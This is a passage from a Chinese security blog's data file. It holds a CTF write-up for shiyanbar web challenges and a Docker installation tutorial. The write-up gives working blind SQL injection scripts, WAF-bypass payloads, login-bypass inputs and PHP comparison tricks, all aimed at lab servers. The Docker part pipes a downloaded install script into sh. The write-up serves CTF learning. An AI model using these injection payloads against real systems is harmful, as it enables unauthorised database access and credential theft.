fTttg9b2dmlRQB2wKxEn27hHN45sol0LUSvvsEnc5b6iJZHcMAXbn4tdhpB0I0BsqzkaRqWMra2IMRK7uZKHWcG+/","categories":[{"name":"随笔","slug":"随笔","permalink":"http://chaosec.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"Essay","slug":"Essay","permalink":"http://chaosec.top/tags/Essay/"}]},{"title":"实验吧web","slug":"实验吧web","date":"2018-06-10T14:48:28.000Z","updated":"2019-01-30T11:51:11.305Z","comments":true,"path":"2018/06/10/实验吧web/","link":"","permalink":"http://chaosec.top/2018/06/10/%E5%AE%9E%E9%AA%8C%E5%90%A7web/","excerpt":"前言 最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目","text":"前言 最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目 后台登录 打开网页后查看元素发现sql逻辑语句 1$sql &#x3D; &quot;SELECT * FROM admin WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;&quot;.md5($password,true).&quot;&#39;&quot;; 这个不知道密码，此处思路是md5()函数返回16进制字符串，然后16进制字符串会和SQL语句拼接，如果能够凑出一个password的字符串为 &#39; or &#39;a 这样的内容的话，不就可以绕过了，那么去哪找这样的字符串呢，一看题目url，看到了 ffifdyop ,直接提交一下这个东西，居然正好就是可以。 加了料的报错注入 本题一开始我以为是报错注入，结果才知道是个盲注，题目过滤了很多东西，比如union,substr,=等，所以尝试正则注入，这也是我第一次写这个方面脚本，可能是网速的原因，注入非常慢，这里就只写一下其中的一个payload，注意：正则表达式需要对特殊字符添加转义才可以。 1234567891011121314151617181920212223import stringimport requestskeys = string.ascii_lowercase + r'!_&#123;&#125;@~,' + string.digitsflag = ''flag_yes = 'You are our member'url = 'http://ctf5.shiyanbar.com/web/baocuo/index.php'payload = \"' or (select group_concat(column_name) from information_schema.tables where !(table_schema &lt;&gt; database())) regexp '^&#123;&#125;' and 2&gt;'1\"data = &#123;'username':'aa','password':payload&#125;for i in range(15): for item in keys: tmp = item data['password'] = payload.format(flag + tmp) res = requests.post(url,data=data).text if flag_yes in res: flag += tmp print(flag) break print(i)print('database:',flag) 认真一点！ 这题看了别人的wp，确实6啊，自己的注入还是太菜鸡了 直接id=0或id=1发现页面回显不同，应该是盲注，再输入id=1aaaaaa,发现也可以回显，于是可以利用这个来测试过滤了，输入id=1or,会发现被过滤，继续用相同方法测试发现and,空格，^,union,substr,逗号,%等许多都被过滤了，但是发现引号没有被过滤，可以继续测试尝试闭合id=0&#39;%0aoorr%0a&#39;or&#39;=&#39;*，这说明or是被当做空格处理一次这样的方式过滤的，之前也试过/**/但是没有用,才使用%0a绕过空格过滤，接下来考试考虑盲注， 1234567891011121314151617181920212223242526272829303132333435363738import stringimport requestsfrom urllib import parsekeys = string.ascii_lowercase + string.digits + r'!_&#123;&#125;@~.'flag = ''flag_yes = 'You are in'url = r'http://ctf5.shiyanbar.com/web/earnest/index.php'payload = \"0'%0aoorr%0a((select%0agroup_concat(table_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.tables%0awhere%0atable_schema=database())%0aregexp%0a\" + \"'&#123;&#125;$')\" + \"%0aoorr%0a'b'='a\"def blind_inje(payload): flag = '' data = &#123;'id':payload&#125; ok = True while ok: for item in keys: data['id'] = parse.unquote(payload.format(item + flag)) res = requests.post(url,data=data).text # print(payload.format(item + flag)) if flag_yes in res: flag = item + flag print(flag) break if item == '.': ok = False print('[+]:',flag)# blind_inje(payload)# table_name:fiag@users# payload1 = \"0'%0aoorr%0a((select%0agroup_concat(column_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.columns%0awhere%0atable_name='fiag')%0aregexp%0a\" + \"'&#123;&#125;$')\" + \"%0aoorr%0a'b'='a\"# blind_inje(payload1)# column_name:fl.4g或者fl$4gpayload2 = \"0'%0aoorr%0a((select%0agroup_concat(fl$4g)%0afrom%0afiag)%0aregexp%0a'&#123;&#125;$')%0aoorr%0a'b'='a\"blind_inje(payload2)# flag:flag&#123;haha~you.win!&#125;注意点号只是一个通配符，所以这个点究竟是那个字符得多试几次# flag:flag&#123;haha~you win!&#125; NSCTF web200 题目给出了加密代码，直接逆向跑一遍就好了 123456789101112&lt;?php $str = 'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';$str = base64_decode(strrev(str_rot13($str)));$flag = '';for($i=0;$i&lt;strlen($str);$i++)&#123; $_c = substr($str, $i, 1); $a = ord($_c); $b = chr($a-1); $flag = $flag.$b;&#125;echo strrev($flag);?&gt; 登录一下好吗 先随便输入信息登录，页面会显示你的登录用户名和密码，需要注意的是页面返回的是处理之后的数据，所以可以据此判断哪些字符遭到了过滤，比如 uesrname=admin&#39; or 1=1,前端回显就没有了or，说明or被过滤，剩下的就不说了，本题可以使用万能密码，payload 1username&#x3D;&#39;&#x3D;&#39;&amp;password&#x3D;&#39;&#x3D;&#39; 那么在数据库中就变成了 select * from users where username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39; ，所以就成了select * from users where 1 and 1 注意他逻辑运算的时候是一次从前往后运算的。 天下武功唯快不破 看题目描述可知这题考察脚本编写，因为他要求你立即在限定时间内提交返回的base64解码的值，如果手工操作速度肯定来不及，所以直接上脚本 123456789101112131415161718import requestsimport base64url = 'http://ctf5.shiyanbar.com/web/10/10.php'response = requests.get(url).headers['FLAG']flag = base64.b64decode(response)flag = flag.decode('utf-8')flag = flag.split(':')flag = flag[1]data = &#123;'key':flag&#125;res = requests.post(url,data=data).textprint(res) 可以得到flag 让我进去 修改cookie里的source的值为1可以看到源代码 123456789101112131415161718192021222324252627$flag = \"XXXXXXXXXXXXXXXXXXXXXXX\";$secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security!$username = $_POST[\"username\"];$password = $_POST[\"password\"];if (!empty($_COOKIE[\"getmein\"])) &#123; if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") &#123; if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) &#123; echo \"Congratulations! You are a registered user.\\n\"; die (\"The flag is \". $flag); &#125; else &#123; die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); &#125; &#125; else &#123; die (\"You are not an admin! LEAVE.\"); &#125;&#125;setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[\"source\"])) &#123; setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE[\"source\"] != 0) &#123; echo \"\"; // This source code is outputted here &#125;&#125; 代码逻辑要求username=admin而password不等于admin，然后cookie里面的getmein的MD5值与$secret+username+password的值拼接取MD5相等即可绕过验证，这里需要用到hash长度扩展攻击，具体原理可以参看网上其他文章，这里推荐一个工具Python包hashpump，我是在linux下使用的 简单的SQL注入3 题目虽然说的是报错注入，但是确保报错注入的函数给过滤完了，所以题目实际上是个盲注，直接盲注就可以了，上一波脚本 1234567891011121314151617181920212223import requestsimport stringurl = 'http://ctf5.shiyanbar.com/web/index_3.php'payload = \"?id=0' or (substr(database(),&#123;&#125;,1)='&#123;&#125;')%23\" # database:web1words = string.ascii_lowercase + string.digits + '&#123;&#125;_!~@%^&amp;*-'flag_yes = 'Hello'flag = ''payload1 = \"?id=0' or (substr((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;')%23\"# table_name: flag@web1payload2 = \"?id=0' or (substr((select group_concat(flag separator '@') from information_schema.columns where table_name='flag'),&#123;&#125;,1)='&#123;&#125;')%23\"# column_name = flag@idpayload3 = \"?id=0' or (substr((select group_concat(flag separator '@') from flag),&#123;&#125;,1)='&#123;&#125;')%23\"for i in range(8,30): for item in words: res = requests.get(url + payload3.format(str(i),item)).text if flag_yes in res: flag += item print(flag) break if item == '-': print('end')# flag&#123;y0u_@r3_5o_damn_90od&#125; 大小写可能有问题 本题没有过滤其他任何东西，所以其实使用sqlmap等工具更为简单，此处贴出脚本这是为了方便大家了解其中的原理。 简单的SQL注入 线简单测试一下 id=1&#39; 页面回显报错，尝试报错注入，可以得到数据库名为 web1 ，在尝试一下过滤了那些字符没回发现过滤了许多字符 from , where ,group_concat , order , union ，这里有许多字符过滤时另加了一个空格，很恶心。 最后用报错注入老是有问题，后来决定换union试一下 1?id&#x3D;0&#39; uunion nion selselect ect group_congroup_concatcat(table_name) frfrom om information_schema.tables whwhere ere table_sctable_schemahema&#x3D;&#39;web1 可知表名flag,web_1 , 1?id&#x3D;0&#39; uunion nion selselect ect group_congroup_concatcat(colucolumn_namemn_name) frfrom om informinformatiion_schemaation_schema.columns whwhere ere table_name&#x3D;&#39;flag 结果返回权限不够 SELECT command denied to user ‘web1’@’localhost’ for table ‘columns’ 又看到题目说获取flag值，猜测列名应该是flag， 最终payload 1?id&#x3D;0&#39; uunion nion selselect ect flag frfrom om flag whwhere ere &#39;a&#39;&#x3D;&#39;a 简单的SQL注入2 1?id&#x3D;1&#39;%23 可以正常回显，加空格则不可以，说明过滤了空格，后面测试发现还过滤了括号。空格的绕过可以用/**/绕过，括号的话本题返回的结果数为所有结果，所以其实并不需要括号 123?id&#x3D;-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;table_name&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables%23?id&#x3D;-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;column_name&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;%23?id&#x3D;-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag%23 这个看起来有点简单 很常规的一套操作 1http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() 后面的省略 因缺思汀的绕过 查看元素即可得到源码，这是基础，源码位置在 source.txt 。 123456789101112131415161718192021222324252627282930313233343536function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1)&#123; print \"姘村彲杞借垷锛屼害鍙禌鑹囷紒\"; exit(); &#125;&#125;$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db=\"XXXXXX\";mysql_select_db($db, $con);$sql=\"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'\";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print \"CTF&#123;XXXXXX&#125;\"; &#125;else&#123; print \"浜﹀彲璧涜墖锛�\"; &#125;&#125;else&#123; print \"涓€棰楄禌鑹囷紒\";&#125;mysql_close($con);?&gt; 关键代码如下： 12345678910$sql&#x3D;&quot;SELECT * FROM interest WHERE uname &#x3D; &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;&quot;;$query &#x3D; mysql_query($sql); if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; $key &#x3D; mysql_fetch_array($query); if($key[&#39;pwd&#39;] &#x3D;&#x3D; $_POST[&#39;pwd&#39;]) &#123; print &quot;CTF&#123;XXXXXX&#125;&quot;; &#125;else&#123; print &quot;浜﹀彲璧涜墖锛�&quot;; &#125;&#125; 第一道绕过要求必须返回结果切值返回一行结果，可以考虑limit，由于逗号也被过滤了，故可以使用offset来控制返回的结果个数，例如： 1select * from users where username&#x3D;&#39;&#39; or 1&#x3D;1 limit 1 offset 0 但是这里第二道过滤要求提交的密码和数据库中的对应的密码相同，这个就困难了，因为我们并不知道数据库中的pwd字段值，所以这个时候看了别的大佬想到了rollup，说来惭愧，这个我之前学习SQL的时候还专门看过，结果在这题却没有想到，哎，真的是菜鸡，为什么可以用rollup原理可以在我的博客中《SQL学习笔记三》中找到，原理就是使用rollup子句会多产生一个汇总行，如果我们没有指定聚合函数，那么它的值就会是NULL，rollup子句是和group by子句一起使用的，只会在group指定的列中产生汇总行，那么就可尝试构造payload了 1uname&#x3D;uname&#x3D;&#39; or 1&#x3D;1 group by pwd with rollup limit 1 offset 2#&amp;pwd&#x3D; 这里通过更改offset后面的数字值来使数据库返回有NULL的那一行即可，至于pwd值可以利用PHP弱比较，空字符与NULL相比较会返回true，所以我们pwd不传参即可是比较返回true。 注意：这题用的rollup子句我在自己的数据库上试了之后发现不行，原因在于sql_mode的设置，查看一下数据库的该值 Variable_name | Valuesql_mode | ONLY_FULL_GROUP_BY,STRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER 默认会设置有 ONLY_FULL_GROUP_BY这个模式，此时group by子句中必须包含所查询的所有列，具体的信息可以查看我的之前那篇博客，这是默认开启的，而此题目该模式应该是关闭的，运行命令 1set GLOBAL sql_mode&#x3D;&#39;TRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER&#39; 如此即可以在自己的数据库上实现相同的效果。 天网管理系统 查看元素，发现语句 1$test&#x3D;$_GET[&#39;username&#39;]; $test&#x3D;md5($test); if($test&#x3D;&#x3D;&#39;0&#39;) 可知是利用md5弱比较， 故提交username为 s878926199a ,即可得到下一个页面地址，得到如下语句 123456$unserialize_str &#x3D; $_POST[&#39;password&#39;]; $data_unserialize &#x3D; unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] &#x3D;&#x3D; &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]&#x3D;&#x3D;&#39;???&#39;) &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年 看代码可知是简单的反序列化的应用，但是比较坑的是这儿的user和pass的值是布尔true，因为题目提示了成也布尔，败也布尔（23333） 1234$a[&#39;user&#39;] &#x3D; true;$a[&#39;pass&#39;] &#x3D; true;$b &#x3D; serialize($a);print($b); 提交就可以了。 拐弯抹角 代码审计，就是绕过的题目的过来吧就好了 1http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;indirection\\index.php&#x2F;index.php 关键点就是还是利用\\来替换/，尽管题目限制了\\，但是在此处并没有受到限制 Forms 查看元素，发现一段代码 1&lt;input name&#x3D;&quot;showsource&quot; value&#x3D;&quot;0&quot; type&#x3D;&quot;hidden&quot;&gt; 直接修改值为1即可查看源代码，然后一波简单操作就得到flag 忘记密码了 先随便输入个邮箱之后页面会返回跳转链接 step2.php?email=youmail@mail.com&amp;check=??????? ,访问发现页面会自动跳转到step1.php，抓包看一下发现关键点 1234567&lt;form action&#x3D;&quot;submit.php&quot; method&#x3D;&quot;GET&quot;&gt; &lt;h1&gt;æ¾åå¯ç step2&lt;&#x2F;h1&gt; email:&lt;input name&#x3D;&quot;emailAddress&quot; type&#x3D;&quot;text&quot; &lt;br &#x2F;&gt; value&#x3D;&quot;youmail@mail.com&quot; disable&#x3D;&quot;true&quot;&#x2F;&gt;&lt;&#x2F;br&gt; token:&lt;input name&#x3D;&quot;token&quot; type&#x3D;&quot;text&quot; &#x2F;&gt;&lt;&#x2F;br&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt;&lt;&#x2F;form&gt; 访问submit.php页面，提示不是admin，在查看抓包内容 12&lt;meta name&#x3D;&quot;admin&quot; content&#x3D;&quot;admin@simplexue.com&quot; &#x2F;&gt;&lt;meta name&#x3D;&quot;editor&quot; content&#x3D;&quot;Vim&quot; &#x2F;&gt; 发现是vim编辑器，那么可能是备份文件泄露，访问 .submit.php.swp得到源代码，核心过滤如下 12if(strlen($token)!=10) die('fail');if($token!='0') die('fail'); 这个用0e即可绕过，剩下的就是admin的邮箱，前面有一段内容 content=&quot;admin@simplexue.com&quot; 猜测可能就是admin邮箱，提交一下果然可以 1http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;10&#x2F;upload&#x2F;submit.php?emailAddress&#x3D;admin@simplexue.com&amp;token&#x3D;0e00000000 once more 很简单，ereg()函数截断，只在PHP5中才有，注意要在地址栏中提交因为在题目给的输入框中提交会再次url编码 11e8%00*-* Guess next session 1234567891011&lt;?phpsession_start(); if (isset ($_GET[&#39;password&#39;])) &#123; if ($_GET[&#39;password&#39;] &#x3D;&#x3D; $_SESSION[&#39;password&#39;]) die (&#39;Flag: &#39;.$flag); else print &#39;&lt;p&gt;Wrong guess.&lt;&#x2F;p&gt;&#39;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 题目最后一行给出的应该是密码的生成逻辑，显然是不可能构造出来的，那么我们可以通过修改session(删除掉对应的sessionid)使 $_SESSION[&#39;password&#39;] 为空，那么我们提交一个空的密码那么在验证时就会有 &#39;&#39;==&#39;&#39; 为true，即可验证通过 FALSE 12345678910111213&lt;?phpif (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else&#123; echo '&lt;p&gt;Login first!&lt;/p&gt;';&#125;?&gt; sha1数组绕过即可 1?name[]&#x3D;2&amp;password[]&#x3D;1 程序逻辑问题 查看元素可以看到有个 index.txt ，访问以下得到源码，这里只给出部分 123456789101112131415161718192021if($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect(\"********\", \"*****\", \"********\"); mysql_select_db(\"phpformysql\") or die(\"Could not select database\"); if ($conn-&gt;connect_error) &#123; die(\"Connection failed: \" . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = \"select pw from php where user='$user'\";$query = mysql_query($sql);if (!$query) &#123; printf(\"Error: %s\\n\", mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[\"pw\"]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo \"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;\";&#125; 分析题目逻辑，先是将输入的密码值md5变换一下，在数据中查询与用户名相等的用户名并提取结果，然后用返回结果对应的密码字段和刚昂MD5变换后的字段比较，如果相等则成功返回flag，我刚开始想思路放在strcasecmp()函数上，思路并不对。这题的突破口在于sql语句，我们可以尝试sql注入，尝试绕过这个user认证字段，即user字段提交 1&#39; and 0&#x3D;1 union select &#39;c4ca4238a0b923820dcc509a6f75849b&#39;# 那么此时数据库返回的$row[pw]就是输入的这段md5值(1的md5值)，我们只需要在密码字段提交1即可绕过了，最终payload 1user&#x3D;&#39; and 0&#x3D;1 union select &#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pass&#x3D;1 PHP大法 url二次编码绕过 1?id&#x3D;%2568%2561%2563%256b%2565%2572%2544%254a 貌似有点难 简单的x-forwarded-for修改即可 看起来有点难 先是随便在admin字段尝试（因为admin字段有回显），当输入 admin&#39; and 1=1# 时返回“登录失败，错误的用户名和密码”，而如果输入 admin&#39; and 1=2# 时，则返回“数据库连接错误”！！，所以这儿是一处注入点 判断数据库长度 admin&#39; and length(database())=4# 可知数据库长度为4，接下来爆库名 ?admin=admin&#39; and substr(database(),1,3)=&#39;tes&#39;%23&amp;pass=12456&amp;action=login ,数据库名是 test 盲注脚本 1234567891011121314151617181920212223import requestsurl = \"http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and \"dic = ',1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@'# payload = \"substr((Select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"yes = '错误'length = 1table_name = '' # admincolumn_name = '' # username,password# payload = \"substr((Select group_concat(column_name) from information_schema.columns where table_name='admin'),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"payload = \"substr((Select group_concat(username,password) from admin),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"while(True): for i in dic: res = requests.get(url + payload.format(str(length),i)).text.encode('latin-1').decode('gb2312') if yes in res: # table_name += i column_name += i length += 1 print(column_name) break if i == '@': print('aaaaaaaaaaaaaaaaaaaaaa')# admin,idnuenna 猫抓老鼠 脑洞题，注意题目响应头 Content-Row: MTUyODYyMjkxMQ== 直接把这个内容提交验证即可。。 头有点大 打开后看到有如下要求 You don’t have permission to access / on this server.Please make sure you have installed .net framework 9.9!Make sure you are in the region of England and browsing this site with Internet Explorer 第一个本题好像实际上并没有限制，第二个可以通过修改user-agent字段，修改为 1: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; Trident&#x2F;7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 9.9; .NET CLR 3.5.30729; rv:11.0) like Geckog 第三个要求来自英国，可以通过修改accept-language字段的值 1en-gb;q&#x3D;0.8","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"Docker简介与简单页面搭建","slug":"docker1","date":"2018-04-20T04:56:05.000Z","updated":"2019-01-30T11:55:43.416Z","comments":true,"path":"2018/04/20/docker1/","link":"","permalink":"http://chaosec.top/2018/04/20/docker1/","excerpt":"Docker简介 最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。","text":"Docker简介 最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。 Docker安装 安装前检查 内核版本(具体支持哪些版本可以在官网查看) 1uname -a 如果内核不支持可以升级内核 检查Device Mapper(存储驱动) 1ls -l &#x2F;sys&#x2F;class&#x2F;misc&#x2F;device-mapper 查看文件是否存在 安装Docker 安装Docker有两种可用的版本，一种是Ubuntu维护的版本，一种是Docker维护的版本，推荐安装Docker维护的版本，因为它的版本较新，安装步骤官方已经编写成一个脚本，可以非常简单的安装，我们只需要下载这个脚本并运行即可， Ubuntu 试了好多种方法才安装好，最后还是用了官方推荐的方法，我的版本号如下 Linux ubuntu 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 由于在公共镜像仓库拉取镜像需要https协议，需要对于组件的安装。 123apt-get install curlapt-get install ca-certificatesapt-get install software-properties-common 1apt-get install apt-transprt-https 安装不顺利，报错：Unable to locate package apt-transprt-https，需要单独下载安装包及依赖包 1234wget http:&#x2F;&#x2F;ftp.nl.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;a&#x2F;apt&#x2F;apt-transport-https_1.4.8_amd64.debdpkg -i apt-transport-https_1.4.8_amd64.debwget http:&#x2F;&#x2F;ftp.nl.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;a&#x2F;apt&#x2F;libapt-pkg5.0_1.4.8_amd64.debdpkg -i libapt-pkg5.0_1.4.8_amd64.deb 添加 Docker 官方的 GPG key 1curl -fssl https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add - 将 Docker 的源添加到 /etc/apt/sources.list 1add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot; 更新一下镜像 1apt-get update 安装docker 1apt-get install docker-ce 开启docker守护进程 1sudo service docker start 运行第一个容器，输出‘hello world’ 1sudo docker run centos echo &#39;hello world&#39; CentOS 执行安装脚本 1sudo apt-get update 1curl -fsSL https:&#x2F;&#x2F;get.docker.com&#x2F; | sh 安装完成后查看版本信息 1sudo docker version 开启docker守护进程 1sudo service docker start 运行第一个容器，输出‘hello world’ 1sudo docker run centos echo &#39;hello world&#39; 以上命令都只是在root权限下运行，如果要在非root权限下运行，则需要将当前用户添加进去docker用户组中 1sudo groupadd docker 1sudo gpasswd -a charles docker 之后重启docker服务 1sudo service docker restart 注销当前账户再重新登录即可运行docker命令啦！ 1docker version Windows Windows安装比较简单，到网址下载之后按照要求安装即可 Docker的基本操作 启动容器 1docker run centos echo &#39;hello world&#39; 在输出hello world之后镜像也就关闭了，无法交互 启动交互式容器 1docker run -i -t IMAGE &#x2F;bin&#x2F;bash -i: —interactive=true|默认是false，为容器始终打开标准输入-t: —tty,为容器分配一个伪tty终端 退出交互shell使用 exit 命令 查看容器 1docker ps [-a] [-l] -a: all-l: latest 1docker inspect 容器唯一ID或名字 该命令可以查看容器的详细信息 定义容器名字 1docker run --name&#x3D;container01 -i -t ubuntu &#x2F;bin&#x2F;bash 重新启动停止的容器 1docker start -i 容器名或ID 删除容器 1docker rm .. 注意： 只能删除已经停止的容器 守护式容器 能够长期运行没有交互式会话适合运行应用程序和服务 以守护形式运行容器 以下列命令打开一个容器 1dcoker run -i -t ubuntu &#x2F;bin&#x2F;bash 但是并不以exit命令退出而是以 ctrl P+Q退出，这样容器就会在后台运行 可以使用 docker ps -a 来查看容器状态可以发下容器确实在后台运行 使用attach命令再次进入容器 1docker attach 容器ID 使用 exit 命令即可退出容器 启动守护式容器最重要的方式 1docker run -d 镜像名 [command] 我们来启动一个守护式容器 1docker run --name dc1 -d ubuntu &#x2F;bin&#x2F;sh -c &quot;while true;do echo &#39;hello world&#39;; sleep 1; done&quot; 容器在后台运行，可以使用日志来查看执行情况 1docker logs -tf --tail 0 dc1 参数的具体含义可在帮助文档中查看 除了使用logs之外，还可使用进程命令 1docker top dc1 在已经运行的容器中启动新的进程 1docker exec [-d] [-i] [-t] 容器名 [command] 关闭守护式容器有两种方法 1docker stop dcname 1docker kill dcname stop命令会等待容器执行完毕后关闭容器，而kill则会直接关闭容器。 具体想要查看更多命令的相关情况可以使用man命令 123man docker-runman docker-top... 在docker容器中部署静态网站 设置容器的端口映射 1run -p|-P -P: 对容器所有的端口进行映射-p: 指定映射哪些容器的端口 开始部署 先运行一个带端口映射的容器 1docker run -i -t --name web -p 80 ubuntu &#x2F;bin&#x2F;bash 进入容器之后安装Nginx 12apt-get updateapt-get install -y nginx 接下来安装vim，用来编辑网页文件和配置文件 1apt-get install -y vim 新建一个工作目录 1mkdir -p &#x2F;var&#x2F;www&#x2F;html 切换到工作目录下,编辑一个静态页面 12cd &#x2F;var&#x2F;www&#x2F;htmlvim index.html 具体编辑过程省略，接下来编辑Nginx配置文件 查找一下Nginx文件的位置 1whereis nginx 查看文件目录 1ls &#x2F;etc&#x2F;nginx 1ls &#x2F;etc&#x2F;nginx&#x2F;sites-enabled 可以看到有个default文件，修改该文件 将root的值改为刚才创建的文件目录 root: /var/www/html 这样，配置就完成了，切换回根目录,运行Nginx 12cd &#x2F;nginx 可以使用ps命令查看nginx是否已经运行 1ps -ef 可以看到命令已经运行了,还可以查看到端口号，然后用Ctrl+P+Q退出 然后访问静态页面 1curl http:&#x2F;&#x2F;127.0.0.1:port 我们也可以用容器的IP地址来访问 1docker inspect web 可以看到容器ip地址和映射端口 “IPAddress”: “172.17.0.2”“HostPort”: “32768” 访问 1curl http:&#x2F;&#x2F;172.17.0.2 这就不需要指定端口号了，用默认的80端口即可 我们停止该容器 1docker stop web 然后在打开该服务 运行 ps -ef 可以看到并没有开启Nginx服务 这是退出容器 然后用exec命令开启Nginx服务 1docker exec web nginx 1docker top web 可以看到Nginx服务已经开启，但是这是不能用前面的ip地址访问，因为容器映射的地址已经改变，需要重新查看地址映射才能访问 至此，简单搭建静态页面完成。 Docker镜像操作 镜像是容器构架的基石，接下里介绍一下如何查看和删除镜像 12345docker images [OPTIONS] [REPOSITORY] -a,--all&#x3D;false -f,--filter &#x2F;&#x2F;过滤条件 --no-trunc&#x3D;false &#x2F;&#x2F;以非截断方式显示镜像信息，默认关闭 -q,--quiet&#x3D;false 1docker images centos 返回docker中对应的centos镜像 查看镜像 12docker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...] -f,--format&#x3D;&quot;&quot; 删除镜像 123docker rmi [OPTIONS] IMAGE -f,--force&#x3D;false &#x2F;&#x2F;强制删除 